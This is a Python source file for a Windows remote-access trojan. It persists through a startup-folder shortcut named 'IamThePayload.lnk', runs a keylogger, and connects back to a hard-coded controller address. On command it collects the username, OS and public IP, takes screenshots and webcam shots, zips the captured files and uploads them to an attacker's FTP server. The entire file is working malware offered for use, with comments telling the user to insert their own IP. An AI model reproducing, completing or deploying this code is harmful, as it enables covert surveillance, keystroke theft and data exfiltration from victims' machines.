import threading 
import keylogger_modul
import socket
import sys
import urllib.request
import os
import getpass
import pyautogui
import shutil
import time
import platform
import ssl
import ftplib
from swinlnk.swinlnk import SWinLnk
from cv2 import *
from datetime import datetime


# First Start
if not os.path.exists('C:\\Users\\'+getpass.getuser()+'\\payload'):
    os.makedirs('C:\\Users\\'+getpass.getuser()+'\\payload')
    os.makedirs('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files')
    os.makedirs('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files')
    shutil.copyfile("master.exe","C:\\Users\\"+getpass.getuser()+"\\payload\\master.exe")
    swl = SWinLnk()
    swl.create_lnk('C:\\Users\\'+getpass.getuser()+'\\payload\\master.exe', 'C:\\Users\\Windows\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IamThePayload.lnk')



# Keylogger
init_keylogger=keylogger_modul.keylogger_class()
thread_keylogger=threading.Thread(target=init_keylogger.keylogger_funktion)
thread_keylogger.start()

# Shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Try to connect
while True:
    try:
        s.connect(("192.168.178.29",50000))                               # You IP and Port!
        break
    except:
        time.sleep(1800)
        continue


try:
    while True:
        data = s.recv(1024)

        if data.decode().lower() == "exit client":              # exit
            raise ConnectionError("Client disconnected")

        elif data.decode().lower() == "show os":                # show os
            s.send(sys.platform.encode())
        
        elif data.decode().lower() == "set global ip":                 # show global ip
            try:
                for i in 1,2,3:
                    try:
                        req = "https://api.ipify.org/"
                        gcontext = ssl.SSLContext() 
                        info_global_ip = urllib.request.urlopen(req, context=gcontext).read()
                        break
                    except:
                        req = "http://api.ipify.org/"
                        info_global_ip = urllib.request.urlopen(req).read()
                        break

                s.send(str(info_global_ip).encode())
            except:
                s.send(b"this works not yet")
        
        elif data.decode().lower() == "show global ip":
            try:
                s.send(str(info_global_ip).encode())
            except:
                s.send(b"this works not yet")


        elif data.decode().lower() == "show username":          # show username
            s.send(getpass.getuser().encode())
        
        elif data.decode().lower() == "show os version":        # show version of OS
            try:
                s.send(platform.platform().encode())
            except:
                s.send(b"this works not yet")

        elif data.decode().lower() == "make screenshot":        # make screenshot   # This is under development and is not yet finished!
            try:
                screen_shot = pyautogui.screenshot()
                screen_shot.save('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files\\'+str(info_global_ip)+'_screenshot_at-'+str(datetime.now().strftime('%m.%d_%H-%M-%S'))+'.png', "PNG")
                s.send(b"screenshot was taken")
            except:
                s.send(b"this works not yet")

        elif data.decode().lower() == "make cam shot":          # make cam shot   # This is under development and is not yet finished!
            try:
                webcam = VideoCapture(0)
                for i in range(0, 5):
                    worked, img = webcam.read()
                    if worked:
                        imwrite('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files\\'+str(info_global_ip)+'_camshot_at-'+str(datetime.now().strftime('%m.%d_%H-%M-%S'))+'.jpg', img)
                        webcam.release()
                        s.send(b"cam shot was taken")
            except:
                s.send(b"this works not yet")

        elif data.decode().lower() == "make zip":               # make zip
            try:
                shutil.make_archive("C:\\Users\\"+getpass.getuser()+"\\payload\\payload_files\\files", "zip", 'C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files') 
                s.send(b"zipped")

            except FileExistsError:
                s.send(b"file exists")
            except:
                s.send(b"this works not yet")

        elif data.decode().lower()== "remove zip":              # remove zip
            try:
                os.remove("C:\\Users\\"+getpass.getuser()+"\\payload\\payload_files\\files.zip")
                s.send(b"removed")

            except FileNotFoundError:
                s.send(b"File not found")
            except:
                s.send(b"this works not yet")

        elif data.decode().lower()== "send ftp zip":
            try:
                filename= str(info_global_ip)+"_at_+"+str(datetime.now().strftime('%m.%d_%H-%M-%S'))+"_send.zip"
                ftp= ftplib.FTP('192.168.178.111')           # IP from FTP Server!
                ftp.login('ftpuser', 'vbox')                # username and password from the ftp server!
                ftp.cwd('/files/')                          # Path from the ftp user pwd!
                uploadfile= open('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files.zip', 'rb') 
                ftp.storbinary('STOR ' + filename, uploadfile)
                ftp.close()
                uploadfile.close()
                s.send(b"file was sent, remove it with 'remove zip'")
            except ConnectionRefusedError:
                s.send(b"ConnectionRefusedError")
            except ConnectionError:
                s.send(b"ConnectionError")
            except FileNotFoundError:
                s.send(b"File not found")
            except:
                s.send(b"this works not yet")

        else:
            pass
finally:
    s.close()
